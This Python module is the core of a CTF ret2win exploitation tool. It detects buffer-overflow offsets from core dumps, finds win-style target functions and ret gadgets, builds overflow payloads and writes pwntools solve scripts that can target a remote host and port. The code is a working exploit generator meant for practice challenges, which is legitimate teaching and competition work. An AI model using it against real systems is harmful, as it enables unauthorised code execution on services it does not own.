#!/usr/bin/env python3
"""
core.py - Ret2Win Core Engine
Provides binary analysis, offset detection via core dumps,
payload generation, hexdump rendering, and execution routines.
"""

import os
import sys
import resource
import glob
import tempfile
import subprocess
import shutil
import errno
import platform
from typing import Optional, Dict, Any, List, Tuple

import builtins
_orig_input = builtins.input

try:
    from pwn import (
        context, process, remote, ELF, cyclic, cyclic_find, p32, p64, log, ROP, Corefile
    )
    # Ensure pwntools term wrapper does not hijack sys.stdout / sys.stderr / sys.stdin / builtins.input
    if hasattr(sys, "__stdout__") and sys.__stdout__ is not None:
        sys.stdout = sys.__stdout__
    if hasattr(sys, "__stderr__") and sys.__stderr__ is not None:
        sys.stderr = sys.__stderr__
    if hasattr(sys, "__stdin__") and sys.__stdin__ is not None:
        sys.stdin = sys.__stdin__
    builtins.input = _orig_input
    builtins._orig_input = _orig_input
except ImportError:
    print("[!] This tool requires pwntools. Install it with: pip install pwntools")
    sys.exit(1)

from rich.table import Table
from rich.text import Text

# Suppress pwntools default console noise when driven by TUI/scripts
context.log_level = 'error'

__all__ = [
    "analyze_binary",
    "check_binary_executable",
    "find_offset",
    "parse_address",
    "build_payload",
    "format_payload_breakdown",
    "format_colorized_hexdump",
    "generate_solve_script",
    "get_elf_functions",
    "validate_offset",
    "clean_core_dumps",
]


# Keywords used to flag likely win()/flag()/shell() style CTF target functions.
# NOTE: "cat" was deliberately removed -- it is too short/common a substring
# and false-matched ordinary symbol names like "relocate", "allocate",
# "indicate", "location" and libc's "strcat"/"strncat", polluting the
# candidate list (and, since auto-fill used to take the first match, could
# silently point the exploit at the wrong function entirely).
WIN_KEYWORDS = [
    "win", "flag", "target", "secret", "shell", "spawn",
    "print", "admin", "backdoor", "pwn", "get_flag",
    "give_shell", "system", "print_flag", "callme"
]

# Common libc / PLT import names that incidentally contain one of the
# keywords above as a substring (e.g. "printf" contains "print", "strcat"
# contains "cat") but are never themselves a CTF win-style target. Without
# this guard they pollute the candidate list, and -- because auto-fill used
# to just take the first (lowest-address) candidate -- could get silently
# auto-selected as the win() target instead of the real target function.
NOISE_SYMBOLS = {
    "printf", "fprintf", "sprintf", "snprintf",
    "vprintf", "vfprintf", "vsprintf", "vsnprintf",
    "wprintf", "fwprintf", "swprintf",
    "scanf", "fscanf", "sscanf",
    "strcat", "strncat",
}

# When several real candidates are found, these exact names (in priority
# order) are the most conventional CTF win-function names, so auto-fill
# should prefer them over an arbitrary address-ordered pick.
_PRIORITY_NAMES = [
    "win", "get_flag", "print_flag", "give_flag", "give_shell",
    "flag", "shell", "backdoor", "callme", "pwn", "system",
]


def _is_noise_symbol(name: str) -> bool:
    """True if `name` (optionally 'plt.'-prefixed) is a known libc/PLT import
    that should never be treated as a win() candidate, even if it happens to
    contain one of WIN_KEYWORDS as a substring."""
    base = name[4:] if name.startswith("plt.") else name
    return base in NOISE_SYMBOLS


def _find_win_candidates(elf) -> List[Dict[str, str]]:
    """Scan an ELF's symbol table for likely win()-style target functions,
    filtering out common libc noise and prioritizing conventional names."""
    candidates: List[Dict[str, str]] = []
    seen = set()

    # Prefer elf.functions if available to ensure only executable functions are selected (avoiding OBJECTs in .bss/.data)
    if hasattr(elf, "functions") and elf.functions:
        sym_items = [(name, f.address) for name, f in elf.functions.items()]
    else:
        sym_items = list(elf.symbols.items())

    for name, addr in sorted(sym_items, key=lambda x: x[1]):
        # Guard against non-string keys (modern pwntools may have integer keys)
        if not isinstance(name, str):
            continue
        # Filter out noisy GOT and internal wrappers
        if name.startswith("got.") or name.startswith("_"):
            continue
        lower_name = name.lower()
        if _is_noise_symbol(lower_name):
            continue
        if any(k in lower_name for k in WIN_KEYWORDS):
            if name not in seen:
                seen.add(name)
                candidates.append({"name": name, "addr": hex(addr)})

    # Stable-sort so that conventionally-named win functions (exact matches
    # in _PRIORITY_NAMES) come first; ties keep their original address order.
    def _priority(c: Dict[str, str]) -> int:
        base = c["name"][4:] if c["name"].lower().startswith("plt.") else c["name"]
        base = base.lower()
        try:
            return _PRIORITY_NAMES.index(base)
        except ValueError:
            return len(_PRIORITY_NAMES)

    candidates.sort(key=_priority)
    return candidates


def clean_core_dumps(directory: Optional[str] = None):
    """Remove leftover core dump files from working directory and binary directory."""
    dirs = ["."]
    if directory and os.path.abspath(directory) != os.path.abspath("."):
        dirs.append(directory)
    for d in dirs:
        for pattern in ["core", "core.[0-9]*", "core.*.coredumpctl", "core.*.apport", "qemu_*.core"]:
            for f in glob.glob(os.path.join(d, pattern)):
                if f.endswith(".py"):
                    continue
                try:
                    os.remove(f)
                except OSError:
                    pass


def get_host_arch() -> str:
    """Returns normalized host machine architecture."""
    m = platform.machine().lower()
    if m in ("x86_64", "amd64"):
        return "amd64"
    if m in ("i386", "i686", "x86"):
        return "i386"
    if m in ("aarch64", "arm64"):
        return "aarch64"
    if m.startswith("arm"):
        return "arm"
    return m


def check_binary_executable(binary_path: str) -> Tuple[bool, Optional[str]]:
    """
    Determines whether a target binary can be executed locally on this host.
    Returns (True, None) if natively executable.
    Returns (True, "Emulated via ...") if foreign but an emulator is detected.
    Returns (False, detailed_reason) if execution will fail due to architecture mismatch.
    """
    if not os.path.isfile(binary_path):
        return False, f"File not found: {binary_path}"

    try:
        elf = ELF(binary_path, checksec=False)
    except Exception as e:
        return False, f"Could not parse ELF binary: {e}"

    host_arch = get_host_arch()
    target_arch = (elf.arch or "").lower()

    # Native architecture checks
    if host_arch == "amd64" and target_arch in ("amd64", "i386"):
        return True, None
    if host_arch == "aarch64" and target_arch in ("aarch64", "arm"):
        return True, None
    if target_arch == host_arch:
        return True, None

    # Check for QEMU user emulation
    qemu_bin = None
    try:
        from pwn import qemu
        qemu_bin = qemu.user_path(arch=target_arch)
    except Exception:
        pass

    if not qemu_bin:
        qemu_bin = shutil.which(f"qemu-{target_arch}") or shutil.which(f"qemu-{target_arch}-static")

    if qemu_bin:
        return True, f"Emulated via {os.path.basename(qemu_bin)}"

    # Check kernel binfmt_misc
    binfmt_entry = f"/proc/sys/fs/binfmt_misc/qemu-{target_arch}"
    if os.path.isfile(binfmt_entry):
        return True, f"Emulated via binfmt_misc ({os.path.basename(binfmt_entry)})"

    reason = (
        f"Target architecture '{target_arch}' ({elf.bits}-bit) cannot execute directly on host '{host_arch}'.\n"
        f"Local execution requires QEMU user-mode emulation:\n"
        f"  • Arch/CachyOS: sudo pacman -S qemu-user qemu-user-binfmt\n"
        f"  • Debian/Ubuntu: sudo apt install qemu-user qemu-user-static"
    )
    return False, reason


def _extract_ip_from_core(core_dump, elf) -> Optional[int]:
    """Cross-platform helper to extract instruction pointer / program counter."""
    try:
        val = core_dump.pc
        if val is not None and val != 0:
            return val
    except Exception:
        pass

    for attr in ("rip", "eip", "pc"):
        val = getattr(core_dump, attr, None)
        if val is not None and val != 0:
            return val

    regs = getattr(core_dump, "registers", {}) or {}
    for r in ("rip", "eip", "pc", "x30", "lr", "ra"):
        if r in regs and regs[r]:
            return regs[r]

    return None


def _extract_sp_from_core(core_dump, elf) -> Optional[int]:
    """Cross-platform helper to extract stack pointer."""
    try:
        val = core_dump.sp
        if val is not None and val != 0:
            return val
    except Exception:
        pass

    for attr in ("rsp", "esp", "sp"):
        val = getattr(core_dump, attr, None)
        if val is not None and val != 0:
            return val

    regs = getattr(core_dump, "registers", {}) or {}
    for r in ("rsp", "esp", "sp", "x31"):
        if r in regs and regs[r]:
            return regs[r]

    return None


def analyze_binary(path: str) -> Dict[str, Any]:
    """
    Inspect an ELF binary for architecture, checksec mitigations,
    candidate win symbols, and lone ret gadgets for stack alignment.
    """
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Binary file not found: {path}")

    elf = ELF(path, checksec=False)
    bits = 64 if elf.bits == 64 else 32

    candidates = _find_win_candidates(elf)

    # Search for a lone ret gadget for x86_64 stack alignment ONLY
    ret_gadget = None
    if bits == 64 and elf.arch == "amd64":
        # First try pwntools ROP gadget finder
        try:
            rop = ROP(elf)
            ret_match = rop.find_gadget(["ret"])
            if ret_match:
                ret_gadget = hex(ret_match.address)
        except Exception:
            ret_gadget = None

        # Fallback to direct opcode search if ROP finder didn't locate one
        if not ret_gadget:
            try:
                ret_addr = next(elf.search(b"\xc3", executable=True))
                ret_gadget = hex(ret_addr)
            except (StopIteration, Exception):
                pass

    can_run, exec_reason = check_binary_executable(path)

    return {
        "path": path,
        "arch": elf.arch,
        "bits": bits,
        "endian": elf.endian,
        "pie": bool(elf.pie),
        "canary": bool(elf.canary),
        "nx": bool(elf.nx),
        "relro": str(elf.relro),
        "candidates": candidates,
        "ret_gadget": ret_gadget,
        "symbols": {k: hex(v) for k, v in elf.symbols.items() if isinstance(k, str) and not k.startswith("got.")},
        "executable": can_run,
        "exec_reason": exec_reason,
    }


def _get_gdb_corefile(binary_path: str, payload: bytes, input_mode: str = "stdin", cwd: Optional[str] = None) -> Optional[Any]:
    """
    Fallback mechanism: Run binary under GDB to generate a core file upon crash.
    This intercepts SIGSEGV before custom signal handlers (e.g. picoCTF challenges)
    can catch it and call exit().
    """
    if not shutil.which("gdb"):
        return None

    binary_dir = cwd or os.path.dirname(os.path.abspath(binary_path)) or "."
    fd_core, core_path = tempfile.mkstemp(prefix="ret2win_gdb_core_")
    os.close(fd_core)

    in_path = None
    try:
        gdb_commands = [
            "-batch",
            "-ex", "set debuginfod enabled off",
            "-ex", "set pagination off",
            "-ex", f"cd {binary_dir}",
            "-ex", f"file {binary_path}",
        ]

        if input_mode == "stdin":
            fd_in, in_path = tempfile.mkstemp(prefix="ret2win_in_")
            with open(fd_in, "wb") as f:
                f.write(payload + (b"\n" if not payload.endswith(b"\n") else b""))
            gdb_commands.extend([
                "-ex", f"run < {in_path}",
                "-ex", f"generate-core-file {core_path}",
                "-ex", "quit"
            ])
        elif input_mode == "argv":
            escaped_payload = payload.decode('latin1', errors='replace').replace('"', '\\"')
            gdb_commands.extend([
                "-ex", f'run "{escaped_payload}"',
                "-ex", f"generate-core-file {core_path}",
                "-ex", "quit"
            ])
        else:
            return None

        subprocess.run(
            ["gdb"] + gdb_commands,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=5.0
        )

        if os.path.isfile(core_path) and os.path.getsize(core_path) > 0:
            with context.local(log_level='critical'):
                return Corefile(core_path)
    except Exception:
        pass
    finally:
        if in_path and os.path.exists(in_path):
            try:
                os.remove(in_path)
            except OSError:
                pass
        if os.path.exists(core_path):
            try:
                os.remove(core_path)
            except OSError:
                pass

    return None


def find_offset(binary_path: str, max_len: int = 2048, input_mode: str = "stdin", logger=None) -> int:
    """
    Crash the binary with a cyclic De Bruijn pattern and inspect the core dump
    to determine the offset to the saved return address (EIP/RIP).
    Handles both canonical and non-canonical fault addresses on 32-bit and 64-bit architectures.
    """
    def _log(msg: str, style: str = ""):
        if logger:
            logger(msg, style)
        else:
            log.info(msg)

    # Enable core dumps for this process tree
    try:
        resource.setrlimit(
            resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
        )
    except Exception as e:
        _log(f"Warning: Could not raise core dump limit: {e}", "yellow")

    elf = ELF(binary_path, checksec=False)
    context.binary = elf
    pattern = cyclic(max_len)

    binary_dir = os.path.dirname(os.path.abspath(binary_path)) or "."
    clean_core_dumps(binary_dir)

    can_run, exec_reason = check_binary_executable(binary_path)
    if not can_run:
        raise RuntimeError(exec_reason)

    _log(f"Launching {binary_path} with {max_len}-byte cyclic pattern...", "cyan")

    timed_out = False
    # Run process
    try:
        if input_mode == "stdin":
            p = process(binary_path, cwd=binary_dir)
            try:
                p.sendline(pattern)
                try:
                    p.wait(timeout=3.0)
                except Exception:
                    timed_out = True
                    p.kill()
            except EOFError:
                pass
        elif input_mode == "argv":
            p = process([binary_path, pattern], cwd=binary_dir)
            try:
                p.wait(timeout=3.0)
            except Exception:
                timed_out = True
                p.kill()
        else:
            raise ValueError(f"Unsupported input mode: {input_mode}")
    except OSError as e:
        if e.errno == errno.ENOEXEC or "Exec format error" in str(e):
            raise RuntimeError(
                f"Target binary '{os.path.basename(binary_path)}' ({elf.arch}) cannot be executed on host ({platform.machine()}).\n"
                f"To run foreign architecture binaries, install QEMU user emulation:\n"
                f"  • Arch/CachyOS: sudo pacman -S qemu-user qemu-user-binfmt\n"
                f"  • Debian/Ubuntu: sudo apt install qemu-user qemu-user-static"
            ) from e
        raise

    output_preview = b""
    try:
        output_preview = p.clean(timeout=0.2)
    except Exception:
        pass

    poll = p.poll()
    core_dump = None
    if not timed_out and poll is not None and poll < 0:
        try:
            with context.local(log_level='critical'):
                core_dump = p.corefile
        except Exception:
            pass

    # GDB fallback: catches SIGSEGV directly before custom handlers (e.g. picoCTF) can exit()
    if core_dump is None:
        core_dump = _get_gdb_corefile(binary_path, pattern, input_mode=input_mode, cwd=binary_dir)

    if core_dump is None:
        out_msg = ""
        if output_preview:
            clean_text = output_preview.decode('latin1', errors='replace').strip()
            if clean_text:
                out_msg = f" Binary output: {clean_text[:120]}"

        if timed_out or poll is None:
            raise RuntimeError(
                "Target binary timed out after 3.0s without crashing. "
                "Verify input delivery mode and interaction."
            )
        elif poll == 0:
            raise RuntimeError(
                f"Target binary exited cleanly (code 0) without crashing.{out_msg} "
                f"The pattern length of {max_len} bytes was likely too short to cause a buffer overflow, "
                "or the binary required different preconditions/input."
            )
        elif poll > 0:
            raise RuntimeError(
                f"Target binary exited with code {poll} (no crash or core dump).{out_msg} "
                "The binary may have failed an internal check or required specific arguments."
            )
        else:
            raise RuntimeError(
                f"Target binary crashed with signal {abs(poll)}, but no core dump was found or parsed. "
                "Verify core dumps are enabled ('ulimit -c unlimited') or pass --offset manually."
            )

    offset = -1
    detected_reg = "unknown"

    # Strategy 1: Check faulting address (on non-canonical ret crashes or invalid jump targets)
    fault_addr = getattr(core_dump, "fault_addr", 0)
    if fault_addr and fault_addr != 0:
        try:
            idx = cyclic_find(fault_addr & 0xFFFFFFFF)
            if idx >= 0:
                offset = idx
                detected_reg = f"fault_addr ({hex(fault_addr)})"
        except Exception:
            pass

    # Strategy 2: Check IP / PC / Link register across architectures
    ip = _extract_ip_from_core(core_dump, elf)
    if offset < 0 and ip and ip != 0:
        try:
            idx = cyclic_find(ip & 0xFFFFFFFF)
            if idx >= 0:
                offset = idx
                detected_reg = f"instruction pointer / PC ({hex(ip)})"
        except Exception:
            pass

    # Check ARM/AArch64/MIPS Link Register explicitly if not found yet
    if offset < 0:
        regs = getattr(core_dump, "registers", {}) or {}
        for lr_reg in ("x30", "lr", "ra"):
            lr_val = regs.get(lr_reg, 0)
            if lr_val and lr_val != 0:
                try:
                    idx = cyclic_find(lr_val & 0xFFFFFFFF)
                    if idx >= 0:
                        offset = idx
                        detected_reg = f"link register {lr_reg} ({hex(lr_val)})"
                        break
                except Exception:
                    pass

    # Strategy 3: Check stack pointer (RSP / ESP / SP)
    if offset < 0:
        sp = _extract_sp_from_core(core_dump, elf)
        if sp and sp != 0:
            ws = elf.bytes
            for sp_offset in [0, -ws, ws, -2 * ws, 2 * ws]:
                try:
                    val = core_dump.read(sp + sp_offset, ws)
                    idx = cyclic_find(val[:4])
                    if idx >= 0:
                        offset = idx
                        detected_reg = f"stack [SP{sp_offset:+d}] ({val[:4]!r})"
                        break
                except Exception:
                    pass

    try:
        clean_core_dumps(binary_dir)
    except Exception:
        pass

    if offset < 0:
        ip_display = hex(ip) if ip is not None else "None"
        raise RuntimeError(
            f"Could not find cyclic pattern in crash registers (fault={hex(fault_addr)}, ip={ip_display}). "
            "The crash did not overwrite the instruction pointer or stack with the pattern. "
            "Increase --max-len or set --offset manually."
        )

    _log(f"Crash detected via {detected_reg} -> Computed Offset: {offset}", "green")
    return offset


def parse_address(val: Any, symbols: Optional[Dict[str, Any]] = None) -> int:
    """
    Parses a string or integer address. Supports hex ('0x401196' or '401196'), decimal,
    or looking up a symbol name if available.
    """
    if isinstance(val, int):
        return val
    s = str(val).strip()
    if not s:
        raise ValueError("Address cannot be empty.")

    # 1. Match symbol table if provided
    if symbols and s in symbols:
        sym_val = symbols[s]
        return int(sym_val, 16) if isinstance(sym_val, str) else int(sym_val)

    # 2. Explicit hex prefix '0x'
    if s.lower().startswith("0x"):
        return int(s, 16)

    # 3. Hex without '0x' if contains hex letters [a-fA-F]
    if any(c in "abcdefABCDEF" for c in s):
        try:
            return int(s, 16)
        except ValueError:
            pass

    # 4. If all digits: check typical memory address ranges (> 0x1000 or length >= 5)
    if s.isdigit():
        if len(s) >= 5:
            try:
                return int(s, 16)
            except ValueError:
                pass
        return int(s)

    try:
        return int(s, 16)
    except ValueError:
        raise ValueError(f"Cannot resolve '{s}' into a valid memory address or symbol.")


def build_payload(offset: int, win_addr: int, bits: int = 64, align: bool = False, ret_gadget: Optional[int] = None) -> bytes:
    """
    Constructs the ret2win payload: junk padding + (optional ret gadget) + win address.
    """
    junk = b"A" * max(0, offset)
    packed_win = p64(win_addr) if bits == 64 else p32(win_addr)

    payload = junk
    if bits == 64 and align and ret_gadget is not None:
        payload += p64(ret_gadget)

    payload += packed_win
    return payload


def format_payload_breakdown(offset: int, win_addr: int, bits: int = 64, align: bool = False, ret_gadget: Optional[int] = None) -> Tuple[bytes, Table]:
    """
    Builds the payload and creates a structured Rich Table breaking down its anatomy.
    """
    junk = b"A" * max(0, offset)
    packed_win = p64(win_addr) if bits == 64 else p32(win_addr)
    packed_ret = p64(ret_gadget) if (bits == 64 and align and ret_gadget is not None) else b""

    payload = junk + packed_ret + packed_win

    table = Table(title="[ Payload Anatomy Breakdown ]", show_header=True, header_style="bold cyan")
    table.add_column("Component", style="bold")
    table.add_column("Size", justify="right")
    table.add_column("Value", style="dim")
    table.add_column("Hex Representation")

    junk_preview = junk[:16].hex() + ("..." if offset > 16 else "")
    table.add_row("Buffer Padding (Junk)", f"{offset} B", f"'A' * {offset}", junk_preview)

    if bits == 64 and align:
        if ret_gadget is not None:
            table.add_row("Stack Align Gadget (ret)", "8 B", hex(ret_gadget), packed_ret.hex())
        else:
            table.add_row("[yellow]Stack Align Gadget[/yellow]", "0 B", "[red]Missing Gadget![/red]", "[yellow]Ret gadget not set[/yellow]")

    table.add_row("Target Function Address", f"{len(packed_win)} B", hex(win_addr), packed_win.hex())
    table.add_row("[bold green]Total Payload[/bold green]", f"[bold green]{len(payload)} B[/bold green]", "", f"...{payload[-16:].hex()}")

    return payload, table


def format_colorized_hexdump(payload: bytes, offset: int, has_align: bool = False, bits: int = 64,
                              ret_gadget: Optional[int] = None) -> Text:
    """
    Renders a colorized hexdump highlighting:
    - Red: Buffer junk padding
    - Yellow: Alignment ret gadget
    - Green: Target win address

    `ret_len` must mirror the exact condition build_payload()/format_payload_breakdown()
    use to decide whether the 8-byte ret-gadget was actually written into the payload
    (bits == 64 AND has_align AND a ret_gadget address is set). Keying this off
    `has_align` alone -- regardless of whether a gadget address was ever available --
    previously caused the first 8 bytes of the win address to be mislabeled as the
    "ret gadget" (yellow) instead of the win address (green) whenever alignment was
    toggled on but no gadget had been configured.
    """
    ret_len = 8 if (has_align and bits == 64 and ret_gadget is not None) else 0
    win_len = 8 if bits == 64 else 4

    text = Text()
    if not payload:
        return Text("Empty payload.", style="dim")

    for row_start in range(0, len(payload), 16):
        row = payload[row_start:row_start + 16]
        text.append(f"{row_start:04x}:  ", style="bright_black")

        # Hex columns
        for i in range(16):
            idx = row_start + i
            if idx < len(payload):
                b = payload[idx]
                if idx < offset:
                    style = "dim red"
                elif idx < offset + ret_len:
                    style = "bold yellow"
                else:
                    style = "bold green"
                text.append(f"{b:02x} ", style=style)
            else:
                text.append("   ")
            if i == 7:
                text.append(" ")

        text.append(" |", style="bright_black")
        # ASCII columns
        for i in range(16):
            idx = row_start + i
            if idx < len(payload):
                b = payload[idx]
                char = chr(b) if 32 <= b <= 126 else "."
                if idx < offset:
                    style = "dim red"
                elif idx < offset + ret_len:
                    style = "bold yellow"
                else:
                    style = "bold green"
                text.append(char, style=style)
            else:
                text.append(" ")
        text.append("|\n", style="bright_black")

    return text


def generate_solve_script(binary_path: str, offset: int, win_addr: int, bits: int = 64, align: bool = False, ret_gadget: Optional[int] = None, remote_target: Optional[Tuple[str, int]] = None, input_mode: str = "stdin") -> str:
    """
    Generates a standalone, production-ready pwntools Python solve script.
    """
    script_lines = [
        "#!/usr/bin/env python3",
        "# Generated by Ret2Win (by -Casper)",
        "# Target: " + binary_path,
        "import os",
        "from pwn import *",
        "",
        f"binary_path = '{binary_path}'",
        "binary_dir = os.path.dirname(os.path.abspath(binary_path)) or '.'",
        "elf = context.binary = ELF(binary_path, checksec=False)",
        "context.log_level = 'info'",
        "",
        f"offset = {offset}",
        f"win_addr = {hex(win_addr)}",
    ]

    if align and ret_gadget is not None:
        script_lines.append(f"ret_gadget = {hex(ret_gadget)}  # 16-byte stack alignment")
        script_lines.append("payload = flat({offset: [ret_gadget, win_addr]})")
    else:
        script_lines.append("payload = flat({offset: win_addr})")

    script_lines.append("")
    if remote_target:
        host, port = remote_target
        script_lines.extend([
            f"# Connect to remote target: {host}:{port}",
            f"io = remote('{host}', {port})",
            "io.sendline(payload)",
            "io.interactive()"
        ])
    else:
        if input_mode == "argv":
            script_lines.extend([
                "# Launch local process with payload as argv[1]",
                "io = process([binary_path, payload], cwd=binary_dir)",
                "io.interactive()"
            ])
        else:
            script_lines.extend([
                "# Launch local process and send payload via stdin",
                "io = process(binary_path, cwd=binary_dir)",
                "io.sendline(payload)",
                "io.interactive()"
            ])

    return "\n".join(script_lines) + "\n"


def get_elf_functions(path: str) -> List[Dict]:
    """
    Return ALL named functions found in the ELF symbol table, not just win candidates.
    Each entry is a dict with 'name', 'addr' (hex string), and 'is_candidate'.
    """
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Binary file not found: {path}")

    elf = ELF(path, checksec=False)
    functions: List[Dict] = []
    seen = set()

    if hasattr(elf, "functions") and elf.functions:
        sym_items = [(name, f.address) for name, f in elf.functions.items()]
    else:
        sym_items = list(elf.symbols.items())

    for name, addr in sorted(sym_items, key=lambda x: x[1]):
        if not isinstance(name, str):
            continue
        if name.startswith("got."):
            continue
        if name not in seen:
            seen.add(name)
            lower_name = name.lower()
            is_cand = (not _is_noise_symbol(lower_name)) and any(k in lower_name for k in WIN_KEYWORDS)
            functions.append({
                "name": name,
                "addr": hex(addr),
                "is_candidate": is_cand
            })

    return functions


def validate_offset(binary_path: str, offset: int, input_mode: str = "stdin") -> bool:
    """
    Quick sanity check for a proposed buffer-overflow offset.
    Sends b'A' * offset + b'BBBB' (or 8 B's for 64-bit) and checks
    whether the crash registers or stack indicate exact control of the return address.
    """
    if not os.path.isfile(binary_path):
        raise FileNotFoundError(f"Binary file not found: {binary_path}")

    try:
        resource.setrlimit(
            resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
        )
    except Exception:
        pass

    elf = ELF(binary_path, checksec=False)
    context.binary = elf
    bits = elf.bits

    marker = b"B" * (8 if bits == 64 else 4)
    payload = b"A" * max(0, offset) + marker

    binary_dir = os.path.dirname(os.path.abspath(binary_path)) or "."
    clean_core_dumps(binary_dir)

    can_run, _ = check_binary_executable(binary_path)
    if not can_run:
        clean_core_dumps(binary_dir)
        return False

    timed_out = False
    try:
        if input_mode == "stdin":
            p = process(binary_path, cwd=binary_dir)
            try:
                p.sendline(payload)
                try:
                    p.wait(timeout=3.0)
                except Exception:
                    timed_out = True
                    p.kill()
            except EOFError:
                pass
        elif input_mode == "argv":
            p = process([binary_path, payload], cwd=binary_dir)
            try:
                p.wait(timeout=3.0)
            except Exception:
                timed_out = True
                p.kill()
        else:
            clean_core_dumps(binary_dir)
            return False
    except OSError:
        clean_core_dumps(binary_dir)
        return False

    poll = p.poll()
    core_dump = None
    if not timed_out and poll is not None and poll < 0:
        try:
            with context.local(log_level='critical'):
                core_dump = p.corefile
        except Exception:
            pass

    # GDB fallback: catches crash before custom signal handlers exit
    if core_dump is None:
        core_dump = _get_gdb_corefile(binary_path, payload, input_mode=input_mode, cwd=binary_dir)

    if core_dump is None:
        clean_core_dumps(binary_dir)
        return False

    expected_num = 0x4242424242424242 if bits == 64 else 0x42424242
    matched = False

    # Check 1: fault_addr
    if getattr(core_dump, "fault_addr", 0) == expected_num:
        matched = True

    # Check 2: instruction pointer / PC / link register
    ip = _extract_ip_from_core(core_dump, elf)
    if ip == expected_num:
        matched = True

    # Check ARM/AArch64/MIPS Link Register explicitly
    regs = getattr(core_dump, "registers", {}) or {}
    for lr_reg in ("x30", "lr", "ra"):
        if regs.get(lr_reg) == expected_num:
            matched = True
            break

    # Check 3: stack value at SP or SP-8
    sp = _extract_sp_from_core(core_dump, elf)
    if sp:
        ws = elf.bytes
        for sp_offset in [0, -ws, ws]:
            try:
                val = core_dump.read(sp + sp_offset, len(marker))
                if val == marker:
                    matched = True
                    break
            except Exception:
                pass

    clean_core_dumps(binary_dir)
    return matched
